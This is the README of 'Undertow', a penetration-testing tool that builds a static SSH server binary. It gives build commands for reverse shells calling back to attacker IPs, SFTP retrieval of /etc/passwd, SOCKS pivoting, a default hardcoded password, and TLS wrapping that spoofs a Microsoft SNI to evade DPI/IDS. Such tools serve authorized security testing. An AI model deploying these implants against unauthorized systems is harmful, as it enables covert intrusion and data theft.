<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Undertow/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Undertow/main/docs/assets/logo-light.svg">
  <img alt="Undertow" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Undertow/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Go](https://img.shields.io/badge/language-Go-00ADD8.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
![License](https://img.shields.io/badge/license-GPLv3-blue.svg)

**Statically-linked SSH server for penetration testing and CTF challenges**

Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding — all in a single static binary under 1.5MB. Optional TLS wrapping hides SSH inside HTTPS to evade DPI/IDS on the wire. Cross-compiled with `CGO_ENABLED=0` for zero dependencies.

> **Authorization Required**: This tool is designed exclusively for authorized security testing with explicit written permission. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

[Quick Start](#quick-start) • [Usage](#usage) • [TLS Wrapping](#tls-wrapping) • [SSH Features](#ssh-features) • [Architecture](#architecture) • [Security](#security)

</div>

---

## Highlights

<table>
<tr>
<td width="50%">

**Interactive PTY Shell**
Full PTY support with Ctrl+C, tab completion, and command history. Linux uses `creack/pty`, Windows 10+ uses ConPTY. No more fighting with raw netcat shells.

**Reverse & Bind Modes**
Reverse mode dials home through firewalls. Bind mode listens on target. Both support the same SSH feature set — PTY, SFTP, and port forwarding work identically in either mode.

**SFTP File Transfer**
Built-in SFTP subsystem for drag-and-drop file transfer. Upload tools, download loot, exfiltrate data — all through the same SSH connection. No need for a separate transfer channel.

**Port Forwarding**
Local, remote, and dynamic (SOCKS) port forwarding. Pivot through the target to reach internal networks, expose services, or tunnel traffic through a compromised host.

</td>
<td width="50%">

**TLS Wrapping**
Optional `--tls` flag wraps SSH inside TLS with ALPN negotiation and SNI spoofing. On the wire it looks like HTTPS — the SSH banner never appears in plaintext. Configurable SNI hostname for blending.

**Single Static Binary**
Cross-compiled with `CGO_ENABLED=0` for zero dependencies. Under 1.5MB for Linux, works on Windows and Linux x86/x64. Deploy by dropping a single file — no runtime, no libraries, no installer.

**Handler Scripts**
Build script auto-generates a handler that starts the listener, displays credentials, and shows the SSH command when a callback arrives. One command to be ready for connections.

**Catppuccin Mocha Theme**
All build output uses the [Catppuccin Mocha](https://catppuccin.com/palette) color palette — status indicators, build configuration, engagement checklists. Because your terminal should look good.

</td>
</tr>
</table>

---

## Quick Start

### Prerequisites

<table>
<tr>
<th>Requirement</th>
<th>Version</th>
<th>Purpose</th>
</tr>
<tr>
<td>Go</td>
<td>1.15+</td>
<td>Compiler toolchain</td>
</tr>
<tr>
<td>Make</td>
<td>Any</td>
<td>Build orchestration</td>
</tr>
<tr>
<td>UPX</td>
<td>Optional</td>
<td>Binary compression (<code>--compress</code>)</td>
</tr>
</table>

### Build

```bash
# Clone repository
git clone https://github.com/Real-Fruit-Snacks/Undertow.git
cd Undertow

# Reverse shell — connects back to your machine
./build.sh reverse 192.168.1.10:4444

# Start the handler (displays SSH command when callback arrives)
./bin/handler-192-168-1-10-4444
```

### Verification

```bash
# Bind shell — listens on target
./build.sh listen 8888

# Connect from attacker
ssh -p 8888 svc@TARGET_IP

# TLS-wrapped reverse shell on port 443
./build.sh reverse 10.10.14.5:443 --tls
```

---

## Usage

### Reverse Shell

**Attacker:**
```bash
./build.sh reverse YOUR_IP:4444
./bin/handler-YOUR_IP-4444
```

**Target:**
```bash
./undertow-YOUR_IP-4444-linux-x64
```

**Connect:** Handler shows the SSH command when callback arrives.

### Bind Shell

**Target:**
```bash
./undertow-listen-8888-linux-x64
```

**Attacker:**
```bash
ssh -p 8888 svc@TARGET_IP
```

### Handler Scripts

The build script auto-generates a handler for reverse mode:

```bash
# Build generates handler alongside binaries
./build.sh reverse 10.10.14.5:4444

# Handler starts listener, displays creds, shows SSH command on callback
./bin/handler-10-10-14-5-4444
```

### Output

Binaries go to `bin/` with descriptive names:

```
bin/
├── undertow-192-168-1-10-4444-linux-x64
├── undertow-192-168-1-10-4444-linux-x86
├── undertow-192-168-1-10-4444-windows-x64.exe
├── undertow-192-168-1-10-4444-windows-x86.exe
└── handler-192-168-1-10-4444       <- Run this on your attack machine
```

---

## TLS Wrapping

SSH traffic is identifiable on the wire via the plaintext `SSH-2.0-*` banner. The `--tls` flag wraps SSH inside TLS, making the outer layer look like HTTPS to DPI/IDS.

```
Without TLS:   Target --SSH--> Attacker:443     (DPI sees SSH banner)
With TLS:      Target --TLS(SSH)--> Attacker:443  (DPI sees HTTPS)
```

```bash
# Reverse shell over TLS on port 443
./build.sh reverse 10.10.14.5:443 --tls

# Custom SNI hostname (default: www.microsoft.com)
./build.sh reverse 10.10.14.5:443 --tls --sni update.windows.com

# Bind shell with TLS
./build.sh listen 443 --tls
```

<table>
<tr>
<th>Feature</th>
<th>Detail</th>
</tr>
<tr>
<td><strong>Certificate</strong></td>
<td>Fresh ECDSA P-256 self-signed cert generated at runtime (no files on disk)</td>
</tr>
<tr>
<td><strong>ALPN</strong></td>
<td>Negotiates <code>h2</code> / <code>http/1.1</code> matching real HTTPS traffic</td>
</tr>
<tr>
<td><strong>SNI</strong></td>
<td>Configurable hostname in ClientHello (default: <code>www.microsoft.com</code>)</td>
</tr>
<tr>
<td><strong>SAN</strong></td>
<td>Certificate SAN matches the SNI hostname</td>
</tr>
<tr>
<td><strong>Both modes</strong></td>
<td>Works identically in reverse and listen modes</td>
</tr>
<tr>
<td><strong>Transparent</strong></td>
<td>All SSH features (PTY, SFTP, port forwarding) work unmodified inside the tunnel</td>
</tr>
</table>

### Connecting to a TLS-Wrapped Listener

Your SSH client needs a TLS tunnel. Use `openssl s_client` or `ncat --ssl` as a proxy:

```bash
ssh -o ProxyCommand='openssl s_client -quiet -connect %h:%p -servername www.microsoft.com' -p 443 svc@TARGET
```

---

## SSH Features

### File Transfer (SFTP)

```bash
sftp -P 8888 svc@127.0.0.1

# One-liner
echo "get /etc/passwd" | sftp -P 8888 svc@127.0.0.1
```

### Port Forwarding

<table>
<tr>
<th>Type</th>
<th>Command</th>
<th>Use Case</th>
</tr>
<tr>
<td><strong>Local</strong></td>
<td><code>ssh -p 8888 -L 8080:internal:80 svc@127.0.0.1</code></td>
<td>Access target's internal services</td>
</tr>
<tr>
<td><strong>Remote</strong></td>
<td><code>ssh -p 8888 -R 9999:localhost:80 svc@127.0.0.1</code></td>
<td>Expose your services to target</td>
</tr>
<tr>
<td><strong>Dynamic</strong></td>
<td><code>ssh -p 8888 -D 9050 svc@127.0.0.1</code></td>
<td>SOCKS proxy through target</td>
</tr>
</table>

### SSH Config

Add to `~/.ssh/config` for convenience:

```
Host target
    Hostname 127.0.0.1
    Port 8888
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
```

Then: `ssh target`

---

## Build Options

```
Usage: ./build.sh <mode> <target> [options]

Modes:
    reverse <IP:PORT>       Build binary that auto-connects to IP:PORT
    reverse <IP> <PORT>     Build binary that auto-connects to IP on PORT
    listen <PORT>           Build binary that listens on PORT
```

### Flags

<table>
<tr>
<th>Option</th>
<th>Default</th>
<th>Description</th>
</tr>
<tr><td><code>-u, --user</code></td><td><code>svc</code></td><td>Username for reverse connections</td></tr>
<tr><td><code>-b, --bind-port</code></td><td><code>0</code></td><td>Port to access shell on attacker (<code>0</code> = random)</td></tr>
<tr><td><code>-p, --password</code></td><td>auto</td><td>Custom password</td></tr>
<tr><td><code>-k, --pubkey</code></td><td>none</td><td>ED25519 public key file</td></tr>
<tr><td><code>-s, --shell</code></td><td><code>/bin/bash</code></td><td>Shell to spawn</td></tr>
<tr><td><code>-c, --compress</code></td><td>off</td><td>Compress with UPX</td></tr>
<tr><td><code>--tls</code></td><td>off</td><td>Wrap SSH inside TLS (looks like HTTPS)</td></tr>
<tr><td><code>--sni HOSTNAME</code></td><td><code>www.microsoft.com</code></td><td>SNI hostname for TLS ClientHello</td></tr>
<tr><td><code>--nocli</code></td><td>off</td><td>Hardcoded binary (no runtime flags)</td></tr>
<tr><td><code>--dry-run</code></td><td>off</td><td>Preview build without executing</td></tr>
<tr><td><code>--show-password</code></td><td>off</td><td>Always display password after build</td></tr>
</table>

### Examples

```bash
# Custom user and random bind port
./build.sh reverse 10.10.14.5:443 --user kali --bind-port 0

# With password and compression
./build.sh reverse 192.168.1.10:22 --password "secret" --compress

# TLS with custom SNI
./build.sh reverse 10.10.14.5:443 --tls --sni update.windows.com

# Minimal hardcoded bind shell
./build.sh listen 4444 --shell /bin/sh --nocli

# Public key auth
./build.sh reverse 10.0.0.1:4444 --pubkey ~/.ssh/id_ed25519.pub

# IPv6 (use brackets and quotes)
./build.sh reverse '[::1]:4444'

# Preview without building
./build.sh reverse 10.10.14.5:443 --tls --dry-run
```

---

## Authentication

<table>
<tr>
<th>Method</th>
<th>Detail</th>
</tr>
<tr>
<td><strong>Password</strong></td>
<td>Default: <code>letmeinbrudipls</code> (or auto-generated at build time)</td>
</tr>
<tr>
<td><strong>Public key</strong></td>
<td>ED25519, enabled when <code>--pubkey</code> is provided</td>
</tr>
<tr>
<td><strong>Username</strong></td>
<td>Default: <code>svc</code></td>
</tr>
<tr>
<td><strong>SSH key</strong></td>
<td><a href="assets/id_undertow">assets/id_undertow</a></td>
</tr>
</table>

```bash
# Custom credentials
./build.sh reverse IP:PORT --password "MyPass"
./build.sh reverse IP:PORT --pubkey ~/.ssh/id_ed25519.pub
```

### Key Generation

The build process handles key generation automatically. The default SSH host key is stored in `assets/id_undertow`. Credentials are displayed during the build process and embedded in the generated handler script.

---

## Runtime Flags

When CLI is enabled (default), the binary accepts runtime flags:

<table>
<tr>
<th>Flag</th>
<th>Default</th>
<th>Description</th>
</tr>
<tr><td><code>-l</code></td><td>off</td><td>Listen mode (bind shell)</td></tr>
<tr><td><code>-p</code></td><td><code>31337</code></td><td>Port</td></tr>
<tr><td><code>-b</code></td><td><code>0</code></td><td>Bind port after reverse</td></tr>
<tr><td><code>-s</code></td><td><code>/bin/bash</code></td><td>Shell</td></tr>
<tr><td><code>-N</code></td><td>off</td><td>Port forwarding only</td></tr>
<tr><td><code>-v</code></td><td>off</td><td>Verbose</td></tr>
</table>

Use `--nocli` at build time to produce a hardcoded binary with no runtime flags.

### Advanced: Direct Make

For cross-compilation or fine-grained control:

```bash
# With variables
LHOST="192.168.1.10" LPORT="443" TLS_WRAP=1 RS_PASS="secret" make

# Cross-compile
GOARCH=arm64 GOOS=linux make
```

<table>
<tr>
<th>Variable</th>
<th>Default</th>
<th>Description</th>
</tr>
<tr><td><code>LHOST</code></td><td>empty</td><td>Target host (enables reverse mode)</td></tr>
<tr><td><code>LPORT</code></td><td><code>31337</code></td><td>SSH port</td></tr>
<tr><td><code>BPORT</code></td><td><code>0</code></td><td>Bind port (<code>0</code> = random, needs OpenSSH 6.0+)</td></tr>
<tr><td><code>LUSER</code></td><td><code>svc</code></td><td>Username</td></tr>
<tr><td><code>RS_PASS</code></td><td>random</td><td>Password</td></tr>
<tr><td><code>RS_PUB</code></td><td>empty</td><td>Authorized public key</td></tr>
<tr><td><code>RS_SHELL</code></td><td><code>/bin/bash</code></td><td>Default shell</td></tr>
<tr><td><code>NOCLI</code></td><td>empty</td><td>Set to disable CLI</td></tr>
<tr><td><code>TLS_WRAP</code></td><td>empty</td><td>Set to enable TLS wrapping</td></tr>
<tr><td><code>TLS_SNI</code></td><td><code>www.microsoft.com</code></td><td>SNI hostname for TLS ClientHello</td></tr>
</table>

---

## Architecture

~800 lines of Go across 6 source files:

```
Undertow/
├── main.go                       # Entry point, SSH server setup, compile-time variables
├── core.go                       # Auth handlers, port forwarding, dialHomeAndListen(), SFTP,
│                                 #   TLS cert generation, ExtraInfo channel
├── ssh_session.go                # Session dispatcher for PTY/command/forwarding-only requests
├── ssh_session_unix.go           # Unix PTY via creack/pty (build tag: !windows)
├── ssh_session_windows.go        # Windows ConPTY / ssh-shellhost fallback (build tag: windows)
├── build.sh                      # Build wrapper with Catppuccin Mocha output
├── Makefile                      # Cross-compilation targets
├── go.mod                        # Dependencies
│
├── assets/
│   ├── id_undertow               # Default SSH keypair
│   └── id_undertow.pub
│
├── docs/                         # ── GitHub Pages ──
│   ├── index.html                # Project website
│   └── assets/
│       ├── logo-dark.svg         # Logo for dark theme
│       └── logo-light.svg        # Logo for light theme
│
└── .github/
    └── workflows/
        └── ci.yml                # CI pipeline
```

### Key Patterns

<table>
<tr>
<th>Pattern</th>
<th>Description</th>
</tr>
<tr><td><strong>Handler factories</strong></td><td><code>createPasswordHandler()</code>, <code>createPublicKeyHandler()</code>, <code>createSFTPHandler()</code>, etc.</td></tr>
<tr><td><strong>Build tags</strong></td><td><code>//go:build windows</code> and <code>//go:build !windows</code> for platform-specific code</td></tr>
<tr><td><strong>Static compilation</strong></td><td><code>CGO_ENABLED=0</code> with <code>-ldflags="-s -w"</code></td></tr>
<tr><td><strong>Custom SSH channel</strong></td><td><code>"rs-info"</code> exchanges <code>ExtraInfo</code> struct (CurrentUser, Hostname, ListeningAddress)</td></tr>
<tr><td><strong>TLS wrapping</strong></td><td><code>generateSelfSignedCert()</code> for listen mode, <code>tls.Client()</code> for reverse mode</td></tr>
<tr><td><strong>Timing-safe auth</strong></td><td><code>subtle.ConstantTimeCompare()</code> for password verification</td></tr>
</table>

### Dependencies

<table>
<tr>
<th>Library</th>
<th>Purpose</th>
</tr>
<tr><td><code>github.com/gliderlabs/ssh</code></td><td>SSH server</td></tr>
<tr><td><code>github.com/pkg/sftp</code></td><td>SFTP subsystem</td></tr>
<tr><td><code>github.com/creack/pty</code></td><td>Unix PTY allocation</td></tr>
<tr><td><code>github.com/ActiveState/termtest/conpty</code></td><td>Windows ConPTY</td></tr>
<tr><td><code>golang.org/x/crypto/ssh</code></td><td>SSH client (reverse connections)</td></tr>
<tr><td><code>golang.org/x/term</code></td><td>Password input</td></tr>
</table>

---

## Platform Support

<table>
<tr>
<th>Capability</th>
<th>Linux</th>
<th>Windows</th>
</tr>
<tr>
<td>Reverse Shell</td>
<td>Full PTY via <code>creack/pty</code></td>
<td>ConPTY (Build 17763+)</td>
</tr>
<tr>
<td>Bind Shell</td>
<td>Full PTY via <code>creack/pty</code></td>
<td>ConPTY (Build 17763+)</td>
</tr>
<tr>
<td>SFTP</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>Local Forwarding</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>Remote Forwarding</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>Dynamic (SOCKS)</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>TLS Wrapping</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>Binary Size</td>
<td>&lt; 1.5 MB (static)</td>
<td>&lt; 1.5 MB (static)</td>
</tr>
<tr>
<td>Architectures</td>
<td>x86, x64</td>
<td>x86, x64</td>
</tr>
</table>

---

## Security

### Vulnerability Reporting

**Report security issues via:**
- GitHub Security Advisories (preferred)
- Private disclosure to maintainers
- Responsible disclosure timeline (90 days)

**Do NOT:**
- Open public GitHub issues for vulnerabilities
- Disclose before coordination with maintainers
- Exploit vulnerabilities in unauthorized contexts

### Threat Model

**In scope:**
- Authorized penetration testing with explicit written permission
- TLS wrapping provides transport-layer evasion against DPI/IDS
- Credentials displayed at build time and embedded in handler scripts

**Out of scope:**
- Endpoint detection evasion (EDR/XDR)
- Anti-forensics or evidence destruction
- Binary obfuscation — do not rely on obscurity

### What Undertow Does NOT Do

Undertow is an **SSH server for penetration testing**, not an offensive framework:

- **Not a C2 framework** — No implant management, tasking queues, or beaconing
- **Not a vulnerability scanner** — No exploit modules or payload generation
- **Not anti-forensics** — Does not destroy evidence or tamper with logs
- **Not endpoint evasion** — Binary can be analyzed by reverse engineers

---

## License

GNU General Public License v3.0

Copyright &copy; 2026 Real-Fruit-Snacks

```
THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND.
THE AUTHORS ARE NOT LIABLE FOR ANY DAMAGES ARISING FROM USE.
USE AT YOUR OWN RISK AND ONLY WITH PROPER AUTHORIZATION.
```

---

## Resources

- **GitHub**: [github.com/Real-Fruit-Snacks/Undertow](https://github.com/Real-Fruit-Snacks/Undertow)
- **Documentation**: [real-fruit-snacks.github.io/Undertow](https://real-fruit-snacks.github.io/Undertow)
- **Issues**: [Report a Bug](https://github.com/Real-Fruit-Snacks/Undertow/issues)
- **Security**: [SECURITY.md](SECURITY.md)
- **Contributing**: [CONTRIBUTING.md](CONTRIBUTING.md)
- **Changelog**: [CHANGELOG.md](CHANGELOG.md)

---

<div align="center">

**Part of the Real-Fruit-Snacks water-themed security toolkit**

[Aquifer](https://github.com/Real-Fruit-Snacks/Aquifer) • [Cascade](https://github.com/Real-Fruit-Snacks/Cascade) • [Conduit](https://github.com/Real-Fruit-Snacks/Conduit) • [Flux](https://github.com/Real-Fruit-Snacks/Flux) • [HydroShot](https://github.com/Real-Fruit-Snacks/HydroShot) • [Riptide](https://github.com/Real-Fruit-Snacks/Riptide) • [Runoff](https://github.com/Real-Fruit-Snacks/Runoff) • [Seep](https://github.com/Real-Fruit-Snacks/Seep) • [Slipstream](https://github.com/Real-Fruit-Snacks/Slipstream) • [Tidepool](https://github.com/Real-Fruit-Snacks/Tidepool) • **Undertow** • [Whirlpool](https://github.com/Real-Fruit-Snacks/Whirlpool)

*Remember: With great power comes great responsibility.*

</div>
